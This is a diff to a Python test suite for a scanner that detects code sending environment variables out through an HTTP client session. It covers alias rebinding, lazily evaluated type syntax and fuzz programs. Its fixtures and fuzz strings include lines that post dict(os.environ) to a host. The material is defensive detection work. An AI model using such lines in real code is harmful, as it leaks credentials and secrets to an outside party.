@@ -1247,6 +1247,14 @@ _DECLARED_BLOCKING_FALSE_NEGATIVES = [
     ("import os\nimport requests\n\nsession = requests.Session()\nout = {}\nout[session.post(host, json=dict(os.environ))] = 1\n", True),
     # Annotation evaluation varies by scope, future flags, and Python version, so it is skipped.
     ("import os\nimport requests\n\nsession = requests.Session()\ndef annotated(value: session.post(host, json=dict(os.environ))):\n    pass\n", True),
+    # A branch-created handle on a name that is *also* an import alias. The receiver anchor must not
+    # swallow this: `_collect_python_aliases` never invalidates an import, so resolving the receiver
+    # as `pathlib.Path.post` and excluding it would drop one of the rebind cases this rule exists
+    # for. The alias only proves a module while it still holds one.
+    (
+        "from pathlib import Path as session\nimport os\nimport requests\n\nif flag:\n    session = requests.Session()\nsession.post(host, json=dict(os.environ))\n",
+        True,
+    ),
 ]
 
 # PEP 695 type syntax the runtime never evaluates on import. Shared by the blocking and heuristic
@@ -1285,8 +1293,8 @@ def test_python_client_exfil_heuristic_covers_the_declared_gap(tmp_path: Path, s
     Coverage is not total: the heuristic drops the *name* requirement, so a rebind, a branch, a
     walrus, an attribute hop, a container item, a factory return, and a cross-scope flow all stop
     mattering. It keeps three syntactic anchors -- a constructor called through a proven import, a
-    sink spelled ``<expr>.method(...)``, and a receiver that is not itself an import path -- so a
-    locally aliased constructor and a detached or dynamic sink remain outside both signals.
+    sink spelled ``<expr>.method(...)``, and a receiver that is not a never-rebound import alias --
+    so a locally aliased constructor and a detached or dynamic sink remain outside both signals.
     """
     result = _scan_skill_source(tmp_path, source)
     reported = _client_exfil_heuristic_findings(result)
@@ -1315,6 +1323,30 @@ def test_python_lazily_evaluated_type_syntax_is_not_a_sink(tmp_path: Path, sourc
 def test_python_client_exfil_heuristic_skips_lazily_evaluated_type_syntax(tmp_path: Path, source: str) -> None:
     """The warning channel may over-report a path, never a construct the runtime cannot evaluate."""
     assert _runtime_client_receivers("flag = True\n" + source) == []
+    assert _client_exfil_heuristic_findings(_scan_skill_source(tmp_path, source)) == []
+
+
+def test_python_client_exfil_heuristic_ignores_a_payload_inside_lazy_syntax(tmp_path: Path) -> None:
+    """The payload half gets the same lazy-node exclusion as the sink half.
+
+    `has_sensitive_read` / `has_env_dump` are computed by the unrestricted walk in `_scan_python`,
+    so reusing them would let a `type` alias -- a value the runtime never evaluates -- satisfy this
+    rule's prerequisite. The sink here is real; only the environment read is unreachable, and the
+    finding must not fire on it.
+    """
+    source = 'import os\nimport requests\n\nclass H:\n    pass\n\nh = H()\nif flag:\n    h.s = requests.Session()\ntype Payload = dict(os.environ)\nh.s.post(host, json={"ok": 1})\n'
+
+    assert _client_exfil_heuristic_findings(_scan_skill_source(tmp_path, source)) == []
+
+
+def test_python_client_exfil_heuristic_keeps_a_stable_import_alias_excluded(tmp_path: Path) -> None:
+    """The inverse of the rebound-alias case: an alias the file never rebinds still names a module.
+
+    This is the OpenTelemetry shape the receiver anchor was added for, and widening that anchor to
+    admit rebound aliases must not quietly re-admit it.
+    """
+    source = "from os import environ\nimport requests\n\nif flag:\n    session = requests.Session()\nendpoint = environ.get('OTEL_EXPORTER_OTLP_ENDPOINT')\nvalues = dict(environ)\n"
+
     assert _client_exfil_heuristic_findings(_scan_skill_source(tmp_path, source)) == []
 
 
@@ -1426,12 +1458,16 @@ _FUZZ_BODIES = [
     "s.post(host, json=dict(os.environ))",
     "s = (t := requests.Session())",
     "del s",
+    # `session` is also an import alias in the preamble, so these two cover the receiver anchor's
+    # boundary: the alias must stop proving "module" once the file rebinds the name.
+    "session = requests.Session()",
+    "session.post(host, json=dict(os.environ))",
 ]
 _FUZZ_WRAPPERS = ["", "if flag:", "for _ in [1]:", "try:", "with requests.Session() as s:"]
 
 
 def _render_fuzz_program(items: list[tuple[str, str]]) -> str:
-    lines = ["import os", "import requests", ""]
+    lines = ["import os", "import requests", "from pathlib import Path as session", ""]
     for body, wrapper in items:
         if not wrapper:
             lines.append(body)
@@ -1461,6 +1497,8 @@ def test_python_client_exfil_heuristic_dominates_the_blocking_signal(items: list
     aliases = _collect_python_aliases(tree)
 
     blocking = _find_client_handle_sink(tree, "fuzz.py")
+    # The finder reports a sink whenever it finds one; whether a payload survives the lazy-node
+    # exclusion is the finding builder's decision, so this stays a sink-to-sink comparison.
     heuristic = _find_client_handle_heuristic_sink(tree, aliases, "fuzz.py")
 
     if blocking is not None:
